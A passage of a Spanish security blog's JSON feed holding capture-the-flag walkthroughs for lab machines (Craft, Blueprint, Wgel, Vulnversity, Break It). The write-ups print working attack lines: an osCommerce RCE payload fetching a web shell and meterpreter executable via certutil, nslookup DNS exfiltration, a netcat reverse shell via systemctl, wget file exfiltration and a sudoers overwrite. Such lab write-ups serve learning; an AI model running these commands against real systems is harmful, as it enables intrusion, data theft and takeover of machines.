modificamos y lo ejecutamos:\n1 2 3 4 5 6 vault secrets enable ssh vault write ssh/roles/root_otp \\ key_type=otp \\ default_user=root \\ cidr_list=172.20.0.0/0 Creamos una credencial para nuestra ip con el rol de root_otp.\n1 vault write ssh/creds/root_otp ip=172.20.0.1 Cuando creamos nuestra credencial nos muestra los detalles:\nUtilizamos la clave (key) como contraseña:\nkey: 70a2c9bc-4644-8bbd-f010-0c08193a3b7f Nos conectamos mediante ssh al usuario root localmente (0.0.0.0):\nssh root@0.0.0.0 Obtenemos una shell como usuario root y nuestra flag root.txt:\n","description":"Craft presenta Gogs donde encontramos el codigo fuente y una vulnerabilidad en una API la cual explotamos para ejecutar una shell inversa. Utilizando credenciales de la base de datos nos conectamos a esta y obtuvimos credenciales para realizar movimiento lateral. Con informacion de los repositorios y de la base de datos obtuvimos acceso al siguiente usuario. El repositorio de Infraestructura nos permitio obtener acceso privilegiado con la informacion de Vault.","id":173,"section":"posts","tags":["eval","python","vault","api","gogs"],"title":"Hack The Box - Craft","uri":"https://sckull.github.io/posts/craft/"},{"content":"\rBlueprint es una maquina de TryHackMe, encontramos osCommerce con multiples vulnerabilidades, explotamos un RCE para descargar una web shell que luego actualizamos a una sesion de meterpreter con acceso privilegiado.\nRoom Titulo Blueprint Descripción Hack into this Windows machine and escalate your privileges to Administrator. Puntos 110 Dificultad Facil Maker MrSeth6797 MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 root@aoiri:~/tryhackme/blueprint# masscan -p1-65535,U:1-65535 blueprint.thm -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-13 06:32:11 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49154/tcp on blueprint.thm Discovered open port 49159/tcp on blueprint.thm Discovered open port 137/udp on blueprint.thm Discovered open port 135/tcp on blueprint.thm Discovered open port 8080/tcp on blueprint.thm Discovered open port 139/tcp on blueprint.thm Discovered open port 3306/tcp on blueprint.thm Discovered open port 49152/tcp on blueprint.thm Discovered open port 445/tcp on blueprint.thm Discovered open port 49160/tcp on blueprint.thm Discovered open port 49153/tcp on blueprint.thm Discovered open port 49155/tcp on blueprint.thm Discovered open port 443/tcp on blueprint.thm # Nmap 7.80 scan initiated Fri Dec 13 00:33:25 2019 as: nmap -sV -sC -o nmap_scan blueprint.thm Nmap scan report for blueprint.thm (blueprint.thm) Host is up (0.23s latency). Not shown: 987 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: 404 - File or directory not found. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 |_http-title: Bad request! | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) 8080/tcp open http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 |_http-title: Index of / 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 0s, deviation: 1s, median: 0s |_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:a9:aa:22:09:2e (unknown) | smb-os-discovery: | OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1 | Computer name: BLUEPRINT | NetBIOS computer name: BLUEPRINT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-12-13T06:35:06+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-12-13T06:35:05 |_ start_date: 2019-12-13T06:32:08 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Dec 13 00:35:22 2019 -- 1 IP address (1 host up) scanned in 116.94 seconds HTTP Encontramos que en el puerto 8080 esta corriendo osCommerce.\nGOBUSTER Utilzamos gobuster en el directorio de oscommers para buscar archivos que puedan ser de utilidad.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 root@aoiri:~/tryhackme/blueprint# gobuster dir -u http://blueprint.thm:8080/oscommerce-2.3.4/catalog/ -x php,html,txt,aspx,asp -t 15 -q -w /usr/share/wordlists/dirb/common.txt /account_history.php (Status: 302) /account_edit.php (Status: 302) /ADMIN (Status: 301) /admin (Status: 301) /Admin (Status: 301) /advanced_search.php (Status: 200) /com2 (Status: 403) /com2.php (Status: 403) /com2.html (Status: 403) /com2.txt (Status: 403) /com2.aspx (Status: 403) /com2.asp (Status: 403) /com3 (Status: 403) /com3.aspx (Status: 403) /com3.asp (Status: 403) /com3.php (Status: 403) /com3.html (Status: 403) /com3.txt (Status: 403) /conditions.php (Status: 200) /contact_us.php (Status: 200) /cookie_usage.php (Status: 200) /Download (Status: 401) /Download.php (Status: 200) /download (Status: 401) /download.php (Status: 200) /ext (Status: 301) /images (Status: 301) /Images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /Index.php (Status: 200) /Login.php (Status: 200) /login.php (Status: 200) /lpt1 (Status: 403) /lpt1.txt (Status: 403) /lpt1.aspx (Status: 403) /lpt1.asp (Status: 403) /lpt1.php (Status: 403) /lpt1.html (Status: 403) /lpt2 (Status: 403) /lpt2.php (Status: 403) /lpt2.html (Status: 403) /lpt2.txt (Status: 403) /lpt2.aspx (Status: 403) /lpt2.asp (Status: 403) /nul (Status: 403) /nul.php (Status: 403) /nul.html (Status: 403) /nul.txt (Status: 403) /nul.aspx (Status: 403) /nul.asp (Status: 403) /opensearch.php (Status: 200) /popup_image.php (Status: 200) /prn (Status: 403) /prn.php (Status: 403) /prn.html (Status: 403) /prn.txt (Status: 403) /prn.aspx (Status: 403) /prn.asp (Status: 403) /product_reviews.php (Status: 302) /products_new.php (Status: 200) /pub (Status: 301) /redirect.php (Status: 302) /reviews.php (Status: 200) /shipping.php (Status: 200) /shopping_cart.php (Status: 200) /specials.php (Status: 200) /ssl_check.php (Status: 200) /tell_a_friend.php (Status: 302) SEARCSPLOIT Con el nombre y la version de oscommerce encontramos varias vulnerabilidades y exploits que afectan a esta plataforma.\nosCommerce 2.3.4.1 - Remote Code Execution Utilizamos el exploit Remote Code Execution, nos permitira ejecutar comandos en el sistema, pero para ello debemos de configurar la ruta de la maquina en el exploit, de igual forma el payload que ejecuta una shell inversa no funciona ya que es un sistema windows.\nPara poder ver el resultado de la ejecucion de nuestro comando podemos utilizar la tecnica de DNS exfil (y por los loles xd).\nNuestro payload se veria de la siguiente forma si deseamos ver el path donde estamos actualmente.\n1 cmd.exe /C cd c:/ \u0026amp; 10.8.1.72 \u0026amp; for /f %i in (\\\u0026#39; @echo %cd% \\\u0026#39;) do nslookup %i 10.8.1.72 Con la configuracion (IP, Puerto y directorio de la plataforma) realizada, podemos correr responder en la interfaz tun0, y al lanzar nuestro exploit nos aparecera la ruta en una solicitud de DNS de responder.\nVemos que desordenada la informacion pero el path actual es:\nC:/xampp/htdocs/oscommerce.2.3.4/catalog/install/includes/ Sabiendo esto podemos verificar si podemos escribir y crear dentro de archivos con el payload:\n1 2 3 4 payload = \u0026#39;\\\u0026#39;);\u0026#39; payload += \u0026#39;$var = shell_exec(\u0026#34;cmd.exe /C echo \\\u0026#39;hello\\\u0026#39; \u0026gt; hehe.txt \u0026amp; nslookup test 10.8.1.72 \u0026#34;);\u0026#39; payload += \u0026#39;echo $var;\u0026#39; payload += \u0026#39;/*\u0026#39; Vemos que que el archivo se creó exitosamente:\nUtilizamos este pequeño codigo php para ejecutar comandos, lo alojamos en nuestra maquina y levantamos un servidor web con python3:\n1 \u0026lt;?php echo shell_exec($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt; Nuestro payload para descargar el archivo en la maquina utilizando certutil:\n1 2 3 4 payload = \u0026#39;\\\u0026#39;);\u0026#39; payload += \u0026#39;$var = shell_exec(\u0026#34;cmd.exe /C certutil -urlcache -split -f http://10.8.1.72/shell.php shell.php \u0026amp; nslookup test 10.8.1.72 \u0026#34;);\u0026#39; payload += \u0026#39;echo $var;\u0026#39; payload += \u0026#39;/*\u0026#39; Vemos nuestro archivo y ejecutamos comandos:\nTenemos permisos de administrador en la maquina y podemos ver la direccion actual en la que nos encontramos, de igual forma podemos leer nuestra bandera que se encuentra en el directorio del usuario administrator.\nShell - Metasploit Utilizando metasploit con certutil podemos obtener una shell y sacar el archivo que contiene los hash de los usuarios en windows para ello vamos a crear nuestro payload con msfvenom y poner a la escucha metasploit.\nMsfvenom:\n1 msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=1338 -f exe \u0026gt; shell.exe Metasploit:\n1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost tun0 set lport 1338 exploit Payload - exploit osCommerce:\n1 2 3 4 payload = \u0026#39;\\\u0026#39;);\u0026#39; payload += \u0026#39;$var = shell_exec(\u0026#34;cmd.exe /C certutil.exe -urlcache -split -f http://10.8.1.72/shell.exe shell.exe \u0026amp; shell.exe \u0026amp; nslookup test 10.8.1.72 \u0026#34;);\u0026#39; payload += \u0026#39;echo $var;\u0026#39; payload += \u0026#39;/*\u0026#39; Obtuvimos una sesion meterpreter:\nPara obtener los hash utilizamos el comando hashdump, los cuales podemos crackear utilizando john o hashcat:\n","description":"Blueprint es una maquina de TryHackMe, encontramos osCommerce con multiples vulnerabilidades, explotamos un RCE para descargar una web shell que luego actualizamos a una sesion de meterpreter con acceso privilegiado.","id":174,"section":"posts","tags":["osCommerce 2.3.4.1","DNS exfil","metasploit"],"title":"TryHackMe - Blueprint","uri":"https://sckull.github.io/posts/blueprint/"},{"content":"\rWgel CTF es una maquina de TryHackMe, tras enumerar el sitio web encontramos una clave privada que nos dio acceso por SSH. Escalamos privilegios modificando el archivo sudoers con Wget.\nRoom Titulo Wgel CTF Descripción Can you exfiltrate the root flag? Puntos 110 Dificultad Facil Maker MrSeth6797 NMAP Escaneo de puertos tcp, vemos dos puertos abiertos http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # Nmap 7.80 scan initiated Fri Dec 27 19:44:55 2019 as: nmap -p- --min-rate 1000 -o scannmap 10.10.116.173 Nmap scan report for 10.10.116.173 Host is up (0.20s latency). Not shown: 65533 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Dec 27 19:46:23 2019 -- 1 IP address (1 host up) scanned in 87.39 seconds Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-27 19:47 CST Nmap scan report for 10.10.116.173 Host is up (0.43s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA) | 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA) |_ 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.86 seconds HTTP En el puerto 80 esta corriendo apache.\nAnalizamos el codigo fuente del index de apache y econtramos un comentario que no es comun en el index de apache.\nGOBUSTER Escaneo de directorios y archivos con gobuster.\n1 2 3 4 5 root@aoiri:~/tryhackme/wgel_ctf# gobuster dir -u http://10.10.116.173/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) /sitemap (Status: 301) Pagina web en /sitemap/ Nuevamente hacemos un escaneo con gobuster pero ahora a la pagina que encontramos (/sitemap/).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 root@aoiri:~/tryhackme/wgel_ctf# gobuster dir -u http://10.10.116.173/sitemap/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q /.ssh (Status: 301) /about.html (Status: 200) /blog.html (Status: 200) /contact.html (Status: 200) /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /services.html (Status: 200) /shop.html (Status: 200) /work.html (Status: 200) root@aoiri:~/tryhackme/wgel_ctf# Encontramos un directorio (/.ssh) donde se encuentra una clave privada de ssh.\nSSH - Jessie Iniciamos session con Jessie y la clave privada que encontramos anteriormente, obtenemos una shell ssh y nuestra primera flag user_flag.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y encomtramos que podemos correr el comando wget.\nPara obtener nuestra segunda flag utilizamos wget con el parametro --post-file con la ruta del archivo y hacia la IP donde queremos enviar el archivo. Ponemos a la escucha netcat (local) en el puerto 80.\nComando:\n1 sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.8.1.72 Netcat con la flag root_flag.txt.\nROOT SHELL Para obtener una shell con privilegios de administracion primero obtenemos el archivo /etc/sudoers mediante la misma forma que con la flag, editamos el archivo sudoers localmente agregando nuestra propia configuracion para el usuario Jessio.\nCambiamos esta linea por la segunda en el archivo:\n1 2 #jessie ALL=(root) NOPASSWD: /usr/bin/wget jessie ALL=(ALL) NOPASSWD: ALL Una vez hecho esto levantamos un servidor con python3 en la ruta donde se encuentra nuestro archivo sudoers.\nY en la maquina wgel ejecutamos el comando wget con sudo el cual va a sobreescribir el archivo /etc/sudoers.\nNos ubicamos en la carpeta /etc/ y ejecutamos:\n1 sudo /usr/bin/wget 10.8.1.72/sudoers --output-document=sudoers Verificamos con el comando sudo -l -l que la configuracion haya cambiado.\nEjecutamos el comando sudo su y obtenemos una shell con privilegios root.\n","description":"Wgel CTF es una maquina de TryHackMe, tras enumerar el sitio web encontramos una clave privada que nos dio acceso por SSH. Escalamos privilegios modificando el archivo sudoers con Wget.","id":175,"section":"posts","tags":[],"title":"TryHackMe - Wgel CTF","uri":"https://sckull.github.io/posts/wgel/"},{"content":"\rVulnversity es una maquina de TryHackMe, es una maquina del PATH de Complete Beginner, aca se muestra la solucion para cada una de las secciones.\nRoom Titulo Vulnversity Descripción Learn about active recon, web app attacks and privilege escalation. Puntos 368 Dificultad Facil Maker tryhackme { Reconnaissance } Comenzamos desde esta tarea, la primera es desplegar nuestra maquina. En esta tarea utilizamos nmap una herramienta para realizar un escaneo de hosts, puertos, servicios y ejecutar scripts en una red.\nnmap flag Descripcion -sv Determina la version del servicio -p or -p- Escanea el puerto x o escanea todos los puertos -Pn Solo escanea puertos abiertos y no hosts -A Determina la version del SO y ejecuta scripts -sC Escanea con scripts por default -v Verbosidad -sU Puertos UDP -sS Puertos TCP Info From Vulnersity room.\nNMAP Comenzamos escaneando todos los puertos tcp y servicios disponibles en el host y guardar el reporte en un archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # Nmap 7.80 scan initiated Wed Dec 25 15:31:22 2019 as: nmap -sS -T4 -sV -p- -o nmap_scan 10.10.193.246 Nmap scan report for 10.10.193.246 Host is up (0.17s latency). Not shown: 65529 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 25 15:45:34 2019 -- 1 IP address (1 host up) scanned in 851.97 seconds { Locating directories using GoBuster } Utilizamos GoBuster para escanear directorios y archivos en la pagina web que esta corriendo en el puerto 3333.\nGoBuster flag Descripcion -e Imprime la URL completa -u La url Objetivo -w Direccion del wordlist -U y -P usuario y constraseña para autenticacion -p Proxy para las peticiones -c Especifica el cookie para autenticacion Info From Vulnersity room.\nGOBUSTER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 root@aoiri:~# gobuster dir -u http://10.10.193.246:3333 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.193.246:3333 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/12/25 15:56:20 Starting gobuster =============================================================== /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /internal (Status: 301) /js (Status: 301) /server-status (Status: 403) =============================================================== 2019/12/25 15:58:19 Finished =============================================================== Realizamos un escaneo al directorio /internal/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 root@aoiri:~/tryhackme/www# gobuster dir -u http://10.10.193.246:3333/internal/ -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.193.246:3333/internal/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/12/25 16:15:40 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /index.php (Status: 200) /uploads (Status: 301) =============================================================== 2019/12/25 16:17:19 Finished =============================================================== { Compromise the webserver } El directorio /internal nos muestra una pagina donde podemos subir archivos.\nAl intentar subir un archivo con extension .php, .txt, .jpg nos muestra un mensaje de error.\nBURPSUITE Utilizamos burpsuite para poder capturar la solicitud que hacemos al enviar el archivo, cambiando la extension y enviarla nuevamente con diferentes extenciones las cuales puedan ser interpretadas por php.\nOWASP - Unrestricted File Upload\nUtilizamos una shell inversa que nos trae Kali Linux (/usr/share/webshells/php/php-reverse-shell.php) cambiamos la ip y el hacia donde va la shell. Intentamos subir este archivo y capturamos la solicitud con burpsuite.\nEnviamos la solicitud a Intruder, agregamos un marcador de payload a la extension del archivo para poder hacer la misma solicitud pero con diferente extension.\nEn la pestaña de payloads agregamos las extensiones que vamos a utilizar.\n1 2 3 4 5 .php4 .php5 .pht .phtml .ini Comenzamos el \u0026lsquo;Ataque\u0026rsquo;, al finalizar vemos que una de las solicitudes fue exitosa con la extension .phtml.\nRevisamos la pagina de /internal/uploads/ y vemos que nuestro archivo esta ahora en el servidor.\nVisitamos nuestro archivo para que se ejecute y obtenemos una shell.\n{ Privilege Escalation } Ahora que tenemos una shell en la maquina podemos buscar una manera para poder obtener permisos root, comenzamos enumerando los archivos SUID con find.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x 1 root root 31K Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40K May 16 2018 /bin/mount -rwsr-xr-x 1 root root 139K Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 40K May 16 2017 /bin/su -rwsr-xr-x 1 root root 645K Feb 13 2019 /bin/systemctl -rwsr-xr-x 1 root root 27K May 16 2018 /bin/umount -rwsr-xr-x 1 root root 35K Mar 6 2017 /sbin/mount.cifs -rwsr-sr-x 1 daemon daemon 51K Jan 14 2016 /usr/bin/at -rwsr-xr-x 1 root root 49K May 16 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 40K May 16 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 74K May 16 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newgidmap -rwsr-xr-x 1 root root 39K May 16 2017 /usr/bin/newgrp -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newuidmap -rwsr-xr-x 1 root root 53K May 16 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 23K Jan 15 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 134K Jul 4 2017 /usr/bin/sudo -rwsr-xr-- 1 root messagebus 42K Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 419K Jan 31 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 15K Jan 15 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-sr-x 1 root root 97K Jan 29 2019 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 75K Jul 17 11:22 /usr/lib/squid/pinger -rwsr-xr-x 1 root root 39K Jun 14 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamos a utilizarlo para obtener privilegios root, con los siguientes comandos.\nGTFOBINS - Systemctl\nPrimero creamos un archivo el cual va ejecutar una shell inversa:\n1 echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1337 \u0026gt;/tmp/f\u0026#34; \u0026gt; /tmp/shell.sh Creamos un servicio y lo ejecutamos con systemctl.\n1 2 3 4 5 6 7 8 9 10 TF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;bash /tmp/shell.sh\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF Obtenemos una shell con el usuario root.\n","description":"Vulnversity es una maquina de TryHackMe, es una maquina del PATH de Complete Beginner, aca se muestra la solucion para cada una de las secciones.","id":176,"section":"posts","tags":["suid"],"title":"TryHackMe - Vulnversity","uri":"https://sckull.github.io/posts/vulnversity/"},{"content":"\rBreak It nos trae una serie de retos que vienen en tres fases, la primera codificacion en las distintas bases existentes, la segunda fase una serie de retos relacionado a codificacion y encriptacion en cipher, la tercera face pero no la mas facil una serie de retos de codificacion, encriptacion en cipher y bit shift.\nRoom Titulo Break it Descripción Can you break the code? Puntos 360 Dificultad Media Maker DesKel Codificacion en Base Base Ejemplo: \u0026ldquo;breakit\u0026rdquo; Base2 01100010 01110010 01100101 01100001 01101011 01101001 01110100 Base8 142 162 145 141 153 151 164 Base16 62 72 65 61 6b 69 74 Base32 MJZGKYLLNF2A==== Base58 4jP4KDubX1 Base62 22udqyscMu Base64 YnJlYWtpdA== Base85 @WH$gCM@k Base91 %zmfv;:YH Encriptacion Cipher Cipher Ejemplo: \u0026ldquo;breakit\u0026rdquo; Caesar Cipher iylhrpa (shift 7) Vigenere Cipher uyqtrum (key: thm) Decodificadores Hex Workshop\nCyberChef\ndcode\ncryptii\nBase85.io\n{ Fase 01 - Base } #1 [Super easy] Reto\nMVQXG6K7MJQXGZJTGI====== Solucion\n1 2 3 sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$ echo MVQXG6K7MJQXGZJTGI====== | base32 -d easy_base32 sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$ #2[Easy] Reto\nTVJYWEtZVE1NVlBXRVlMVE1WWlE9PT09 Solucion\n1 2 3 sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$ echo TVJYWEtZVE1NVlBXRVlMVE1WWlE9PT09 | base64 -d| base32 -d double_bases sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$ #3[Moderate] Reto\nGM4HOU3VHBAW6OKNJJFW6SS2IZ3VAMTYORFDMUC2G44EQULIJI3WIVRUMNCWI6KGK5XEKZDTN5YU2RT2MR3E45KKI5TXSOJTKZJTC4KRKFDWKZTZOF3TORJTGZTXGNKCOE====== Solucion\nBase32 \u0026gt; Base58 \u0026gt; Base16 \u0026gt; Base64\n[Solucion - CyberChef]\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,true)From_Base58(\u0026#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#39;,true)From_Hex(\u0026#39;Space\u0026#39;)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)\u0026amp;input=R000SE9VM1ZIQkFXNk9LTkpKRlc2U1MySVozVkFNVFlPUkZETVVDMkc0NEVRVUxJSkkzV0lWUlVNTkNXSTZLR0s1WEVLWkRUTjVZVTJSVDJNUjNFNDVLS0k1VFhTT0pUS1pKVEM0S1JLRkRXS1pUWk9GM1RPUkpUR1pUWEdOS0NPRT09PT09PQ #4[Hard] Reto\nHRBUGQDUHFWDIXKUIBWXIJTHIE3DCY3BIE2FKQSZHNDE6MRUIA2TWWDMHRBV2ZKCHQWFCTLPIE2EEJDBIBZCEW3OHUSTOLRCHNFGMVC6IFJXIQ2AHVMVONSBHVOVIM2MHVPV42J4HQVCQ4REIFHVIJ2WHFWDYQSUHROGILJCIFIU23CXHNCEIXK2HRDVSXKOHV2SQJLC Solucion\nBase85 \u0026gt; Base85 \u0026gt; base32 \u0026gt; base85 \u0026gt; base64 \u0026gt; base58 \u0026gt; base85 \u0026gt; base64 \u0026gt; base64\n[Solucion - CyberChef]\nhttps://gchq.github.io/CyberChef/#recipe=From_Base85(\u0026#39;!-u\u0026#39;)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)From_Base85(\u0026#39;!-u\u0026#39;)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base58(\u0026#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#39;,false)From_Base85(\u0026#39;!-u\u0026#39;)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)\u0026amp;input=ODVfY1M3bztaUzg0SFpLOFFcVmM4Tz9LXDhQMnJROE9ZRic2V2wzMzhPWUMoOTJTVms4NTtRQTJHSShMOE81KzI9JyVkYTg1X2NUMTBSPTw4NVdHWDZXP2BVOE9ZQyc3N29zNzhPP1RKNzk7OUA4NiZTZjpKPVlSODU7V0U5aWFWPjhPYzxTOFBxNi84Ni9HYzpKT2hUODYvTWU4UExzNzg2L1BmMWJxWls4NVdEVDspRDA%2BOE9jNk84UDFhPjg0SFpLPV0mKnQ4NWA1UjhQRGBEOE9jOU8xLEQ6Ijg1O05AOFFcVkA4NV9pVjtjbFtnODYuS0U7K2FNTA #5[Insane] Reto - Pastebin\nPastebin\nSolucion\nBase32 \u0026gt; Base85 \u0026gt; Base10 \u0026gt; Base16 \u0026gt; Base91 \u0026gt; Base58 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base10 \u0026gt; Base16\n[Solucion - CyberChef, dcode.fr]\n1- Base32 \u0026gt; Base85 \u0026gt; Base10 \u0026gt; 